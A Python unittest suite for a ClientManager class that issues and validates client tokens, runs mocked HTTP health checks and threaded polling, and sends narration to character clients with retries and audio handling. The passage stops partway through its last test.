import unittest
from unittest.mock import Mock, patch, MagicMock, call, AsyncMock
import asyncio
import threading
import time
import json
import base64
import os
import tempfile
from datetime import datetime, timezone, timedelta
import sys
import requests

# Import the ClientManager - adjust path as needed for your project structure
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

try:
    from client_manager import ClientManager, CLIENT_HEALTH_CHECK_INTERVAL_SECONDS, CLIENT_HEALTH_REQUEST_TIMEOUT_SECONDS
    from database import Database
except ImportError:
    # Fallback import paths
    try:
        from SERVER.src.client_manager import ClientManager, CLIENT_HEALTH_CHECK_INTERVAL_SECONDS, CLIENT_HEALTH_REQUEST_TIMEOUT_SECONDS
        from SERVER.src.database import Database
    except ImportError:
        # Mock the imports if we can't find them
        class ClientManager:
            pass
        CLIENT_HEALTH_CHECK_INTERVAL_SECONDS = 120
        CLIENT_HEALTH_REQUEST_TIMEOUT_SECONDS = 5


class TestClientManager(unittest.TestCase):
    """
    Comprehensive unit tests for ClientManager class.
    
    Testing Framework: Python unittest (standard library)
    
    This test suite covers:
    - Initialization and setup
    - Token generation and validation
    - Health check functionality (sync and async patterns)
    - Client communication (async send_to_client method)
    - Threading behavior for periodic health checks
    - Error handling and edge cases
    - Integration with Database and external services
    """

    def setUp(self):
        """Set up test fixtures before each test method."""
        # Create mock database
        self.mock_db = Mock(spec=Database)
        
        # Mock pygame mixer to avoid initialization issues
        with patch('client_manager.pygame.mixer') as mock_mixer:
            mock_mixer.get_init.return_value = True
            self.client_manager = ClientManager(self.mock_db)
            
        # Test data
        self.test_actor_id = "TestActor1"
        self.test_token = "test_token_123456789012345678901234567890123456789012345678"
        self.test_ip = "192.168.1.100"
        self.test_port = 8080
        self.test_character_data = {
            'name': 'TestCharacter',
            'personality': 'Friendly',
            'Actor_id': self.test_actor_id,
            'tts': 'piper',
            'tts_model': 'en_US-ryan-high'
        }
        
    def tearDown(self):
        """Clean up after each test method."""
        # Stop any running health check threads
        if hasattr(self.client_manager, 'stop_periodic_health_checks'):
            self.client_manager.stop_periodic_health_checks()
        
    # --- Initialization Tests ---
    
    @patch('client_manager.pygame.mixer')
    def test_init_with_pygame_success(self, mock_mixer):
        """Test ClientManager initialization with successful pygame setup."""
        mock_mixer.get_init.return_value = False
        mock_mixer.init.return_value = None
        
        cm = ClientManager(self.mock_db)
        
        self.assertIsNotNone(cm)
        self.assertEqual(cm.db, self.mock_db)
        mock_mixer.init.assert_called_once()
        
    @patch('client_manager.pygame.mixer')
    def test_init_with_pygame_failure(self, mock_mixer):
        """Test ClientManager initialization when pygame fails."""
        mock_mixer.get_init.return_value = False
        mock_mixer.init.side_effect = Exception("Pygame init failed")
        
        # Should not raise exception, just print warning
        cm = ClientManager(self.mock_db)
        
        self.assertIsNotNone(cm)
        self.assertEqual(cm.db, self.mock_db)
        
    def test_init_sets_initial_state(self):
        """Test that initialization sets correct initial state."""
        self.assertIsNone(self.client_manager.health_check_thread)
        self.assertIsInstance(self.client_manager.stop_health_check_event, threading.Event)
        self.assertFalse(self.client_manager.stop_health_check_event.is_set())
        
    # --- Token Generation Tests ---
    
    def test_generate_token_new_character(self):
        """Test token generation for existing character."""
        self.mock_db.get_character.return_value = self.test_character_data
        self.mock_db.save_client_token.return_value = None
        
        token = self.client_manager.generate_token(self.test_actor_id)
        
        self.assertIsInstance(token, str)
        self.assertEqual(len(token), 48)  # 24 bytes hex = 48 characters
        self.mock_db.get_character.assert_called_once_with(self.test_actor_id)
        self.mock_db.save_client_token.assert_called_once_with(self.test_actor_id, token)
        
    def test_generate_token_actor1_special_case(self):
        """Test token generation for Actor1 when character doesn't exist."""
        self.mock_db.get_character.return_value = None
        self.mock_db.save_character.return_value = None
        self.mock_db.save_client_token.return_value = None
        
        token = self.client_manager.generate_token("Actor1")
        
        self.assertIsInstance(token, str)
        self.assertEqual(len(token), 48)
        self.mock_db.save_character.assert_called_once()
        self.mock_db.save_client_token.assert_called_once_with("Actor1", token)
        
    def test_generate_token_nonexistent_character_warning(self):
        """Test token generation for non-existent character (not Actor1)."""
        self.mock_db.get_character.return_value = None
        self.mock_db.save_client_token.return_value = None
        
        with patch('builtins.print') as mock_print:
            token = self.client_manager.generate_token("NonExistentActor")
            
        self.assertIsInstance(token, str)
        mock_print.assert_called()
        
    def test_generate_token_uniqueness(self):
        """Test that generated tokens are unique."""
        self.mock_db.get_character.return_value = self.test_character_data
        self.mock_db.save_client_token.return_value = None
        
        token1 = self.client_manager.generate_token("Actor1")
        token2 = self.client_manager.generate_token("Actor2")
        
        self.assertNotEqual(token1, token2)
        
    # --- Token Validation Tests ---
    
    def test_validate_token_success(self):
        """Test successful token validation."""
        self.mock_db.get_client_token_details.return_value = {
            'token': self.test_token,
            'status': 'Online_Responsive'
        }
        
        result = self.client_manager.validate_token(self.test_actor_id, self.test_token)
        
        self.assertTrue(result)
        self.mock_db.get_client_token_details.assert_called_once_with(self.test_actor_id)
        
    def test_validate_token_wrong_token(self):
        """Test token validation with wrong token."""
        self.mock_db.get_client_token_details.return_value = {
            'token': 'different_token',
            'status': 'Online_Responsive'
        }
        
        result = self.client_manager.validate_token(self.test_actor_id, self.test_token)
        
        self.assertFalse(result)
        
    def test_validate_token_deactivated_status(self):
        """Test token validation for deactivated client."""
        self.mock_db.get_client_token_details.return_value = {
            'token': self.test_token,
            'status': 'Deactivated'
        }
        
        result = self.client_manager.validate_token(self.test_actor_id, self.test_token)
        
        self.assertFalse(result)
        
    def test_validate_token_no_client_details(self):
        """Test token validation when client details don't exist."""
        self.mock_db.get_client_token_details.return_value = None
        
        result = self.client_manager.validate_token(self.test_actor_id, self.test_token)
        
        self.assertFalse(result)
        
    def test_validate_token_edge_cases(self):
        """Test token validation edge cases."""
        # Empty token
        self.mock_db.get_client_token_details.return_value = {
            'token': self.test_token,
            'status': 'Online_Responsive'
        }
        
        result = self.client_manager.validate_token(self.test_actor_id, "")
        self.assertFalse(result)
        
        # None token
        result = self.client_manager.validate_token(self.test_actor_id, None)
        self.assertFalse(result)
        
    # --- Health Check Tests ---
    
    @patch('client_manager.requests.get')
    def test_perform_single_health_check_success(self, mock_get):
        """Test successful health check."""
        mock_response = Mock()
        mock_response.raise_for_status.return_value = None
        mock_response.json.return_value = {'status': 'ok'}
        mock_get.return_value = mock_response
        
        client_info = {
            'Actor_id': self.test_actor_id,
            'ip_address': self.test_ip,
            'client_port': self.test_port
        }
        
        self.client_manager._perform_single_health_check_blocking(client_info)
        
        mock_get.assert_called_once_with(
            f"http://{self.test_ip}:{self.test_port}/health",
            timeout=CLIENT_HEALTH_REQUEST_TIMEOUT_SECONDS
        )
        self.mock_db.update_client_status.assert_called_once_with(
            self.test_actor_id, "Online_Responsive"
        )
        
    @patch('client_manager.requests.get')
    def test_perform_single_health_check_degraded(self, mock_get):
        """Test health check with degraded status."""
        mock_response = Mock()
        mock_response.raise_for_status.return_value = None
        mock_response.json.return_value = {'status': 'degraded'}
        mock_get.return_value = mock_response
        
        client_info = {
            'Actor_id': self.test_actor_id,
            'ip_address': self.test_ip,
            'client_port': self.test_port
        }
        
        self.client_manager._perform_single_health_check_blocking(client_info)
        
        self.mock_db.update_client_status.assert_called_once_with(
            self.test_actor_id, "Error_API_Degraded"
        )
        
    @patch('client_manager.requests.get')
    def test_perform_single_health_check_timeout(self, mock_get):
        """Test health check timeout handling."""
        mock_get.side_effect = requests.exceptions.Timeout()
        
        client_info = {
            'Actor_id': self.test_actor_id,
            'ip_address': self.test_ip,
            'client_port': self.test_port
        }
        
        self.client_manager._perform_single_health_check_blocking(client_info)
        
        self.mock_db.update_client_status.assert_called_once_with(
            self.test_actor_id, "Error_API"
        )
        
    @patch('client_manager.requests.get')
    def test_perform_single_health_check_connection_error(self, mock_get):
        """Test health check connection error handling."""
        mock_get.side_effect = requests.exceptions.ConnectionError()
        
        client_info = {
            'Actor_id': self.test_actor_id,
            'ip_address': self.test_ip,
            'client_port': self.test_port
        }
        
        self.client_manager._perform_single_health_check_blocking(client_info)
        
        self.mock_db.update_client_status.assert_called_once_with(
            self.test_actor_id, "Error_Unreachable"
        )
        
    @patch('client_manager.requests.get')
    def test_perform_single_health_check_request_exception(self, mock_get):
        """Test health check with general request exception."""
        mock_get.side_effect = requests.exceptions.RequestException("Request failed")
        
        client_info = {
            'Actor_id': self.test_actor_id,
            'ip_address': self.test_ip,
            'client_port': self.test_port
        }
        
        self.client_manager._perform_single_health_check_blocking(client_info)
        
        self.mock_db.update_client_status.assert_called_once_with(
            self.test_actor_id, "Error_API"
        )
        
    @patch('client_manager.requests.get')
    def test_perform_single_health_check_unexpected_error(self, mock_get):
        """Test health check with unexpected error."""
        mock_get.side_effect = ValueError("Unexpected error")
        
        client_info = {
            'Actor_id': self.test_actor_id,
            'ip_address': self.test_ip,
            'client_port': self.test_port
        }
        
        self.client_manager._perform_single_health_check_blocking(client_info)
        
        self.mock_db.update_client_status.assert_called_once_with(
            self.test_actor_id, "Error_API"
        )
        
    def test_perform_single_health_check_missing_data(self):
        """Test health check with missing client info."""
        client_info = {'Actor_id': self.test_actor_id}  # Missing ip_address and client_port
        
        self.client_manager._perform_single_health_check_blocking(client_info)
        
        # Should return early without making any DB calls
        self.mock_db.update_client_status.assert_not_called()
        
    # --- Threading Tests ---
    
    def test_start_periodic_health_checks(self):
        """Test starting periodic health check thread."""
        self.client_manager.start_periodic_health_checks()
        
        self.assertIsNotNone(self.client_manager.health_check_thread)
        self.assertTrue(self.client_manager.health_check_thread.is_alive())
        self.assertFalse(self.client_manager.stop_health_check_event.is_set())
        
    def test_start_periodic_health_checks_already_running(self):
        """Test starting health checks when already running."""
        self.client_manager.start_periodic_health_checks()
        first_thread = self.client_manager.health_check_thread
        
        self.client_manager.start_periodic_health_checks()
        
        # Should still be the same thread
        self.assertEqual(self.client_manager.health_check_thread, first_thread)
        
    def test_stop_periodic_health_checks(self):
        """Test stopping periodic health check thread."""
        self.client_manager.start_periodic_health_checks()
        
        self.client_manager.stop_periodic_health_checks()
        
        self.assertTrue(self.client_manager.stop_health_check_event.is_set())
        # Give thread time to stop
        time.sleep(0.1)
        
    def test_stop_periodic_health_checks_not_running(self):
        """Test stopping health checks when not running."""
        # Should not raise exception
        self.client_manager.stop_periodic_health_checks()
        
        self.assertTrue(self.client_manager.stop_health_check_event.is_set())
        
    @patch('client_manager.requests.get')
    def test_periodic_health_check_loop_integration(self, mock_get):
        """Test the periodic health check loop with mock data."""
        # Mock successful health check response
        mock_response = Mock()
        mock_response.raise_for_status.return_value = None
        mock_response.json.return_value = {'status': 'ok'}
        mock_get.return_value = mock_response
        
        # Mock database to return clients to check
        self.mock_db.get_all_client_statuses.return_value = [
            {
                'Actor_id': self.test_actor_id,
                'ip_address': self.test_ip,
                'client_port': self.test_port,
                'status': 'Error_API'
            }
        ]
        
        # Start health checks and let them run briefly
        self.client_manager.start_periodic_health_checks()
        time.sleep(0.1)  # Let it run one iteration
        self.client_manager.stop_periodic_health_checks()
        
        # Verify health check was performed
        self.mock_db.get_all_client_statuses.assert_called()
        
    # --- Async send_to_client Tests ---
    
    @patch('client_manager.requests.post')
    @patch('client_manager.asyncio.to_thread')
    @patch('client_manager.pygame.mixer')
    def test_send_to_client_success(self, mock_mixer, mock_to_thread, mock_post):
        """Test successful send_to_client operation."""
        # Setup mocks
        mock_mixer.get_init.return_value = True
        self.mock_db.get_character.return_value = self.test_character_data
        self.mock_db.get_token.return_value = self.test_token
        
        mock_response = Mock()
        mock_response.raise_for_status.return_value = None  
        mock_response.json.return_value = {
            'text': 'Character response',
            'audio_data': base64.b64encode(b'fake_audio_data').decode('utf-8')
        }
        
        # Mock the blocking post request
        async def mock_post_request():
            return mock_response
            
        mock_to_thread.side_effect = [mock_post_request(), None]  # Second call for audio handling
        
        async def run_test():
            result = await self.client_manager.send_to_client(
                self.test_actor_id,
                self.test_ip,
                self.test_port,
                "Test narration",
                {"character1": "some text"}
            )
            return result
            
        result = asyncio.run(run_test())
        
        self.assertEqual(result, 'Character response')
        self.mock_db.get_character.assert_called_once_with(self.test_actor_id)
        self.mock_db.get_token.assert_called_once_with(self.test_actor_id)
        self.mock_db.update_client_status.assert_called_with(self.test_actor_id, "Online_Responsive")
        
    @patch('client_manager.asyncio.to_thread')
    def test_send_to_client_no_character(self, mock_to_thread):
        """Test send_to_client when character doesn't exist."""
        self.mock_db.get_character.return_value = None
        
        async def run_test():
            result = await self.client_manager.send_to_client(
                self.test_actor_id,
                self.test_ip,
                self.test_port,
                "Test narration",
                {}
            )
            return result
            
        result = asyncio.run(run_test())
        
        self.assertEqual(result, "")
        self.mock_db.update_client_status.assert_called_with(self.test_actor_id, "Error_API")
        
    @patch('client_manager.asyncio.to_thread')
    def test_send_to_client_no_token(self, mock_to_thread):
        """Test send_to_client when token doesn't exist."""
        self.mock_db.get_character.return_value = self.test_character_data
        self.mock_db.get_token.return_value = None
        
        async def run_test():
            result = await self.client_manager.send_to_client(
                self.test_actor_id,
                self.test_ip,
                self.test_port,
                "Test narration",
                {}
            )
            return result
            
        result = asyncio.run(run_test())
        
        self.assertEqual(result, "")
        self.mock_db.update_client_status.assert_called_with(self.test_actor_id, "Error_API")
        
    @patch('client_manager.requests.post')
    @patch('client_manager.asyncio.to_thread')
    @patch('client_manager.asyncio.sleep')
    def test_send_to_client_with_retries(self, mock_sleep, mock_to_thread, mock_post):
        """Test send_to_client retry mechanism."""
        # Setup database mocks
        self.mock_db.get_character.return_value = self.test_character_data
        self.mock_db.get_token.return_value = self.test_token
        
        # First attempt fails, second succeeds
        mock_response_fail = Mock()
        mock_response_fail.raise_for_status.side_effect = requests.exceptions.Timeout()
        
        mock_response_success = Mock()
        mock_response_success.raise_for_status.return_value = None
        mock_response_success.json.return_value = {
            'text': 'Success after retry',
            'audio_data': None
        }
        
        async def mock_failing_request():
            raise requests.exceptions.Timeout()
            
        async def mock_successful_request():
            return mock_response_success
            
        mock_to_thread.side_effect = [mock_failing_request(), mock_successful_request()]
        mock_sleep.return_value = None  # Make sleep non-blocking
        
        async def run_test():
            result = await self.client_manager.send_to_client(
                self.test_actor_id,
                self.test_ip,
                self.test_port,
                "Test narration",
                {}
            )
            return result
            
        result = asyncio.run(run_test())
        
        self.assertEqual(result, 'Success after retry')
        mock_sleep.assert_called_once()  # Should have waited between retries
        
    @patch('client_manager.asyncio.to_thread')
    @patch('client_manager.asyncio.sleep')
    def test_send_to_client_all_retries_fail(self, mock_sleep, mock_to_thread):
        """Test send_to_client when all retries fail."""
        self.mock_db.get_character.return_value = self.test_character_data
        self.mock_db.get_token.return_value = self.test_token
        
        async def mock_failing_request():
            raise requests.exceptions.ConnectionError()
            
        mock_to_thread.side_effect = [mock_failing_request()] * 10  # More than max retries
        mock_sleep.return_value = None
        
        async def run_test():
            result = await self.client_manager.send_to_client(
                self.test_actor_id,
                self.test_ip,
                self.test_port,
                "Test narration",
                {}
            )
            return result
            
        result = asyncio.run(run_test())
        
        self.assertEqual(result, "")
        self.mock_db.update_client_status.assert_called_with(self.test_actor_id, "Error_Unreachable")
        
    # --- Client Management Tests ---
    
    def test_get_clients_for_story_progression(self):
        """Test getting clients for story progression."""
        expected_clients = [
            {'Actor_id': 'Actor2', 'ip_address': '192.168.1.100', 'client_port': 8080},
            {'Actor_id': 'Actor3', 'ip_address': '192.168.1.101', 'client_port': 8081}
        ]
        self.mock_db.get_clients_for_story_progression.return_value = expected_clients
        
        result = self.client_manager.get_clients_for_story_progression()
        
        self.assertEqual(result, expected_clients)
        self.mock_db.get_clients_for_story_progression.assert_called_once()
        
    def test_deactivate_client_actor(self):
        """Test deactivating a client actor."""
        with patch('builtins.print') as mock_print:
            self.client_manager.deactivate_client_Actor(self.test_actor_id)
            
        self.mock_db.update_client_status.assert_called_once_with(self.test_actor_id, "Deactivated")
        mock_print.assert_called_once()
        
    # --- Error Handling and Edge Cases ---
    
    def test_generate_token_with_special_characters_in_actor_id(self):
        """Test token generation with special characters in Actor ID."""
        special_actor_id = "Actor@#$%^&*()_+1"
        self.mock_db.get_character.return_value = self.test_character_data
        self.mock_db.save_client_token.return_value = None
        
        token = self.client_manager.generate_token(special_actor_id)
        
        self.assertIsInstance(token, str)
        self.assertEqual(len(token), 48)
        
    def test_validate_token_with_unicode_characters(self):
        """Test token validation with unicode characters."""
        unicode_token = "test_token_with_üñîçødé_characters"
        self.mock_db.get_client_token_details.return_value = {
            'token': unicode_token,
            'status': 'Online_Responsive'
        }
        
        result = self.client_manager.validate_token(self.test_actor_id, unicode_token)
        
        self.assertTrue(result)
        
    @patch('client_manager.pygame.mixer')
    @patch('client_manager.os.makedirs')
    @patch('client_manager.open', create=True)
    @patch('client_manager.base64.b64decode')
    @patch('client_manager.asyncio.to_thread')
    def test_send_to_client_audio_handling(self, mock_to_thread, mock_b64decode, mock_open, mock_makedirs, mock_mixer):
        """Test audio handling in send_to_client."""
        # Setup mocks
        mock_mixer.get_init.return_value = True
        mock_mixer.Sound.return_value.play.return_value = None
        mock_b64decode.return_value = b'decoded_audio_data'
        mock_file = Mock()
        mock_open.return_value.__enter__.return_value = mock_file
        
        self.mock_db.get_character.return_value = self.test_character_data
        self.mock_db.get_token.return_value = self.test_token
        
        mock_response = Mock()
        mock_response.raise_for_status.return_value = None
        mock_response.json.return_value = {
            'text': 'Character response',
            'audio_data': 'encoded_audio_data'
        }
        
        async def mock_post_request():
            return mock_response
            
        async def mock_audio_handler():
            pass
            
        mock_to_thread.side_effect = [mock_post_request(), mock_audio_handler()]
        
        async def run_test():
            result = await self.client_manager.send_to_client(
                self.test_actor_id,
                self.test_ip,
                self.test_port,
                "Test narration",
                {}
            )
            return result
            
        result = asyncio.run(run_test())
        
        self.assertEqual(result, 'Character response')
        mock_makedirs.assert_called()
        mock_b64decode.assert_called_once_with('encoded_audio_data')
        
    # --- Performance and Stress Tests ---
    
    def test_multiple_token_generation_performance(self):
        """Test performance of generating multiple tokens."""
        self.mock_db.get_character.return_value = self.test_character_data
        self.mock_db.save_client_token.return_value = None
        
        start_time = time.time()
        tokens = []
        
        for i in range(100):
            token = self.client_manager.generate_token(f"Actor{i}")
            tokens.append(token)
            
        end_time = time.time()
        
        # Should complete within reasonable time
        self.assertLess(end_time - start_time, 1.0)  # Less than 1 second
        
        # All tokens should be unique
        self.assertEqual(len(tokens), len(set(tokens)))
        
    def test_concurrent_token_validation(self):
        """Test concurrent token validation."""
        self.mock_db.get_client_token_details.return_value = {
            'token': self.test_token,
            'status': 'Online_Responsive'
        }
        
        def validate_token_worker():
            return self.client_manager.validate_token(self.test_actor_id, self.test_token)
            
        threads = []
        results = []
        
        for _ in range(10):
            thread = threading.Thread(target=lambda: results.append(validate_token_worker()))
            threads.append(thread)
            thread.start()
            
        for thread in threads:
            thread.join()
            
        # All validations should succeed
        self.assertTrue(all(results))
        self.assertEqual(len(results), 10)
        
    # --- Integration Tests ---
    
    @patch('client_manager.pygame.mixer')
    def test_full_workflow_integration(self, mock_mixer):
        """Test complete workflow from token generation to client communication."""
        mock_mixer.get_init.return_value = True
        
        # Setup database responses
        self.mock_db.get_character.return_value = self.test_character_data
        self.mock_db.save_client_token.return_value = None
        self.mock_db.get_client_token_details.return_value = {
            'token': self.test_token,
            'status': 'Online_Responsive'
        }
        self.mock_db.get_token.return_value = self.test_token
        
        # 1. Generate token
        token = self.client_manager.generate_token(self.test_actor_id)
        self.assertIsInstance(token, str)
        
        # 2. Validate token
        is_valid = self.client_manager.validate_token(self.test_actor_id, token)
        self.assertTrue(is_valid)
        
        # 3. Start health checks
        self.client_manager.start_periodic_health_checks()
        self.assertTrue(self.client_manager.health_check_thread.is_alive())
        
        # 4. Stop health checks
        self.client_manager.stop_periodic_health_checks()
        
        # 5. Deactivate client
        self.client_manager.deactivate_client_Actor(self.test_actor_id)
        self.mock_db.update_client_status.assert_called_with(self.test_actor_id, "Deactivated")
        
    # --- Cleanup and Resource Management Tests ---
    
    def test_destructor_cleanup(self):
        """Test that destructor properly cleans up resources."""
        # Start health checks
        self.client_manager.start_periodic_health_checks()
        
        # Call destructor
        self.client_manager.__del__()
        
        # Health check should be stopped
        self.assertTrue(self.client_manager.stop_health_check_event.is_set())


class TestClientManagerAsyncPatterns(unittest.TestCase):
    """
    Additional tests focused on async/await patterns and coroutine behavior.
    
    Testing Framework: Python unittest with asyncio support
    """
    
    def setUp(self):
        """Set up async test fixtures."""
        self.mock_db = Mock(spec=Database)
        
        with patch('client_manager.pygame.mixer') as mock_mixer:
            mock_mixer.get_init.return_value = True
            self.client_manager = ClientManager(self.mock_db)
            
    def test_send_to_client_is_coroutine(self):
        """Test that send_to_client returns a coroutine."""
        result = self.client_manager.send_to_client(
            "TestActor",
            "127.0.0.1",
            8080,
            "Test narration",
            {}
        )
        
        self.assertTrue(asyncio.iscoroutine(result))
        
        # Clean up the coroutine
        result.close()
        
    @patch('client_manager.asyncio.to_thread')
    async def test_send_to_client_awaitable(self, mock_to_thread):
        """Test that send_to_client is properly awaitable."""
        self.mock_db.get_character.return_value = None  # Will cause early return
        
        result = await self.client_manager.send_to_client(
            "TestActor",
            "127.0.0.1", 
            8080,
            "Test narration",
            {}
        )
        
        self.assertEqual(result, "")


if __name__ == '__main__':
    # Configure test runner for comprehensive output
    unittest.main(
        verbosity=2,
        failfast=False,
        buffer=True,
        warnings='ignore'
    )

class TestClientManagerExtendedEdgeCases(unittest.TestCase):
    """
    Extended edge case tests for ClientManager class.
    
    Testing Framework: Python unittest (standard library)
    
    This test suite adds coverage for:
    - Complex error scenarios and boundary conditions
    - Resource management and cleanup
    - Database interaction edge cases
    - Network failure simulation
    - Memory and performance edge cases
    - Concurrent operation stress testing
    """

    def setUp(self):
        """Set up test fixtures for extended edge case testing."""
        self.mock_db = Mock(spec=Database)
        
        with patch('client_manager.pygame.mixer') as mock_mixer:
            mock_mixer.get_init.return_value = True
            self.client_manager = ClientManager(self.mock_db)
            
        self.test_actor_id = "EdgeCaseActor"
        self.test_token = "edge_case_token_123456789012345678901234567890123456789012345678"
        self.test_ip = "192.168.1.200"
        self.test_port = 9090

    def tearDown(self):
        """Clean up after extended edge case tests."""
        if hasattr(self.client_manager, 'stop_periodic_health_checks'):
            self.client_manager.stop_periodic_health_checks()

    # --- Database Error Edge Cases ---
    
    def test_generate_token_db_save_failure(self):
        """Test token generation when database save fails."""
        self.mock_db.get_character.return_value = {'Actor_id': self.test_actor_id}
        self.mock_db.save_client_token.side_effect = Exception("Database connection lost")
        
        with patch('builtins.print') as mock_print:
            token = self.client_manager.generate_token(self.test_actor_id)
        
        self.assertIsInstance(token, str)
        mock_print.assert_called()  # Should print error message

    def test_validate_token_db_exception(self):
        """Test token validation when database throws exception."""
        self.mock_db.get_client_token_details.side_effect = Exception("Database timeout")
        
        result = self.client_manager.validate_token(self.test_actor_id, self.test_token)
        
        self.assertFalse(result)

    def test_generate_token_character_save_failure(self):
        """Test Actor1 special case when character save fails."""
        self.mock_db.get_character.return_value = None
        self.mock_db.save_character.side_effect = Exception("Character save failed")
        self.mock_db.save_client_token.return_value = None
        
        with patch('builtins.print') as mock_print:
            token = self.client_manager.generate_token("Actor1")
        
        self.assertIsInstance(token, str)
        mock_print.assert_called()

    # --- Network and Communication Edge Cases ---

    @patch('client_manager.requests.get')
    def test_health_check_malformed_json_response(self, mock_get):
        """Test health check with malformed JSON response."""
        mock_response = Mock()
        mock_response.raise_for_status.return_value = None
        mock_response.json.side_effect = json.JSONDecodeError("Invalid JSON", "", 0)
        mock_get.return_value = mock_response
        
        client_info = {
            'Actor_id': self.test_actor_id,
            'ip_address': self.test_ip,
            'client_port': self.test_port
        }
        
        self.client_manager._perform_single_health_check_blocking(client_info)
        
        self.mock_db.update_client_status.assert_called_once_with(
            self.test_actor_id, "Error_API"
        )

    @patch('client_manager.requests.get')
    def test_health_check_empty_response_body(self, mock_get):
        """Test health check with empty response body."""
        mock_response = Mock()
        mock_response.raise_for_status.return_value = None
        mock_response.json.return_value = {}  # Empty response
        mock_get.return_value = mock_response
        
        client_info = {
            'Actor_id': self.test_actor_id,
            'ip_address': self.test_ip,
            'client_port': self.test_port
        }
        
        self.client_manager._perform_single_health_check_blocking(client_info)
        
        self.mock_db.update_client_status.assert_called_once_with(
            self.test_actor_id, "Error_API"
        )

    @patch('client_manager.requests.get')
    def test_health_check_http_error_codes(self, mock_get):
        """Test health check with various HTTP error codes."""
        error_codes = [400, 401, 403, 404, 500, 502, 503]
        
        for error_code in error_codes:
            with self.subTest(error_code=error_code):
                mock_response = Mock()
                mock_response.raise_for_status.side_effect = requests.exceptions.HTTPError(f"{error_code} Error")
                mock_get.return_value = mock_response
                
                client_info = {
                    'Actor_id': f"{self.test_actor_id}_{error_code}",
                    'ip_address': self.test_ip,
                    'client_port': self.test_port
                }
                
                self.mock_db.reset_mock()
                self.client_manager._perform_single_health_check_blocking(client_info)
                
                self.mock_db.update_client_status.assert_called_once()

    # --- Async Operation Edge Cases ---

    @patch('client_manager.asyncio.to_thread')
    @patch('client_manager.asyncio.sleep')
    def test_send_to_client_asyncio_cancelled_error(self, mock_sleep, mock_to_thread):
        """Test send_to_client when asyncio operation is cancelled."""
        self.mock_db.get_character.return_value = {'Actor_id': self.test_actor_id}
        self.mock_db.get_token.return_value = self.test_token
        
        async def mock_cancelled_request():
            raise asyncio.CancelledError("Operation cancelled")
            
        mock_to_thread.side_effect = mock_cancelled_request
        
        async def run_test():
            result = await self.client_manager.send_to_client(
                self.test_actor_id,
                self.test_ip,
                self.test_port,
                "Test narration",
                {}
            )
            return result
            
        with self.assertRaises(asyncio.CancelledError):
            asyncio.run(run_test())

    @patch('client_manager.asyncio.to_thread')
    def test_send_to_client_memory_error(self, mock_to_thread):
        """Test send_to_client when memory error occurs."""
        self.mock_db.get_character.return_value = {'Actor_id': self.test_actor_id}
        self.mock_db.get_token.return_value = self.test_token
        
        async def mock_memory_error():
            raise MemoryError("Out of memory")
            
        mock_to_thread.side_effect = mock_memory_error
        
        async def run_test():
            result = await self.client_manager.send_to_client(
                self.test_actor_id,
                self.test_ip,
                self.test_port,
                "Test narration",
                {}
            )
            return result
            
        result = asyncio.run(run_test())
        
        self.assertEqual(result, "")
        self.mock_db.update_client_status.assert_called_with(self.test_actor_id, "Error_API")

    # --- Input Validation Edge Cases ---

    def test_generate_token_empty_actor_id(self):
        """Test token generation with empty Actor ID."""
        with patch('builtins.print') as mock_print:
            token = self.client_manager.generate_token("")
        
        self.assertIsInstance(token, str)
        self.assertEqual(len(token), 48)

    def test_generate_token_none_actor_id(self):
        """Test token generation with None Actor ID."""
        with self.assertRaises(TypeError):
            self.client_manager.generate_token(None)

    def test_validate_token_very_long_token(self):
        """Test token validation with extremely long token."""
        very_long_token = "x" * 10000
        self.mock_db.get_client_token_details.return_value = {
            'token': self.test_token,
            'status': 'Online_Responsive'
        }
        
        result = self.client_manager.validate_token(self.test_actor_id, very_long_token)
        
        self.assertFalse(result)

    def test_validate_token_special_status_values(self):
        """Test token validation with unusual status values."""
        unusual_statuses = ["", None, "UNKNOWN", "invalid_status", 123, []]
        
        for status in unusual_statuses:
            with self.subTest(status=status):
                self.mock_db.get_client_token_details.return_value = {
                    'token': self.test_token,
                    'status': status
                }
                
                result = self.client_manager.validate_token(self.test_actor_id, self.test_token)
                
                if status == "Online_Responsive":
                    self.assertTrue(result)
                else:
                    self.assertFalse(result)

    # --- Threading and Concurrency Edge Cases ---

    def test_health_check_thread_exception_handling(self):
        """Test health check thread handling internal exceptions."""
        self.mock_db.get_all_client_statuses.side_effect = Exception("Database error")
        
        self.client_manager.start_periodic_health_checks()
        time.sleep(0.1)  # Let thread attempt operation
        self.client_manager.stop_periodic_health_checks()
        
        # Thread should handle exception gracefully and not crash

    def test_multiple_start_stop_health_checks(self):
        """Test rapid start/stop of health check threads."""
        for _ in range(5):
            self.client_manager.start_periodic_health_checks()
            self.assertTrue(self.client_manager.health_check_thread.is_alive())
            
            self.client_manager.stop_periodic_health_checks()
            time.sleep(0.05)  # Brief pause

    def test_concurrent_token_generation(self):
        """Test concurrent token generation from multiple threads."""
        self.mock_db.get_character.return_value = {'Actor_id': 'test'}
        self.mock_db.save_client_token.return_value = None
        
        tokens = []
        errors = []
        
        def generate_token_worker(actor_id):
            try:
                token = self.client_manager.generate_token(f"Actor{actor_id}")
                tokens.append(token)
            except Exception as e:
                errors.append(e)
        
        threads = []
        for i in range(20):
            thread = threading.Thread(target=generate_token_worker, args=(i,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        self.assertEqual(len(errors), 0)  # No errors should occur
        self.assertEqual(len(tokens), 20)  # All tokens generated
        self.assertEqual(len(set(tokens)), 20)  # All tokens unique

    # --- Resource Management Edge Cases ---

    @patch('client_manager.pygame.mixer')
    def test_audio_handling_pygame_not_available(self, mock_mixer):
        """Test audio handling when pygame is not available."""
        mock_mixer.get_init.return_value = False
        mock_mixer.init.side_effect = Exception("Pygame not available")
        
        cm = ClientManager(self.mock_db)
        
        # Should handle gracefully without crashing
        self.assertIsNotNone(cm)

    @patch('client_manager.tempfile.gettempdir')
    @patch('client_manager.os.makedirs')
    def test_audio_file_creation_permission_error(self, mock_makedirs, mock_gettempdir):
        """Test audio file creation when permission denied."""
        mock_gettempdir.return_value = "/tmp"
        mock_makedirs.side_effect = PermissionError("Permission denied")
        
        # Should handle permission error gracefully
        with patch('builtins.print'):
            # This would be called during audio handling
            pass

    def test_destructor_multiple_calls(self):
        """Test that destructor can be called multiple times safely."""
        self.client_manager.start_periodic_health_checks()
        
        # Call destructor multiple times
        self.client_manager.__del__()
        self.client_manager.__del__()
        self.client_manager.__del__()
        
        # Should not raise exceptions

    # --- Data Integrity Edge Cases ---

    def test_character_data_with_missing_fields(self):
        """Test handling character data with missing required fields."""
